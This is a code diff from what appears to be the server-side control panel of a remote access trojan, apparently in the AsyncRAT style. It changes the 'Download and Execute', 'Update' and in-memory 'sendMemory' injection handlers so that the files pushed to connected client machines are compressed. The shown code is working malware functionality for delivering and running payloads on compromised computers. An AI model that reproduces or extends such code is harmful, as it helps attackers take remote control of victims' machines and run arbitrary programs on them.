@@ -1486,7 +1486,7 @@ namespace Server
             }
         }
 
-        private async void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
+        private void DownloadAndExecuteToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1496,7 +1496,7 @@ namespace Server
                     MsgPack packet = new MsgPack();
                     packet.ForcePathObject("Packet").AsString = "sendFile";
                     packet.ForcePathObject("Update").AsString = "false";
-                    await packet.ForcePathObject("File").LoadFileAsBytes(openFileDialog.FileName);
+                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
                     packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
 
                     MsgPack msgpack = new MsgPack();
@@ -1543,7 +1543,8 @@ namespace Server
                 {
                     MsgPack packet = new MsgPack();
                     packet.ForcePathObject("Packet").AsString = "sendMemory";
-                    packet.ForcePathObject("File").SetAsBytes(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString()));
+                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(formSend.toolStripStatusLabel1.Tag.ToString())));
+
                     if (formSend.comboBox1.SelectedIndex == 0)
                     {
                         packet.ForcePathObject("Inject").AsString = "";
@@ -1589,7 +1590,7 @@ namespace Server
             }
         }
 
-        private async void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
+        private void UPDATEToolStripMenuItem1_Click(object sender, EventArgs e)
         {
             try
             {
@@ -1598,7 +1599,8 @@ namespace Server
                 {
                     MsgPack packet = new MsgPack();
                     packet.ForcePathObject("Packet").AsString = "sendFile";
-                    await packet.ForcePathObject("File").LoadFileAsBytes(openFileDialog.FileName);
+                    packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)));
+
                     packet.ForcePathObject("Extension").AsString = Path.GetExtension(openFileDialog.FileName);
                     packet.ForcePathObject("Update").AsString = "true";
 
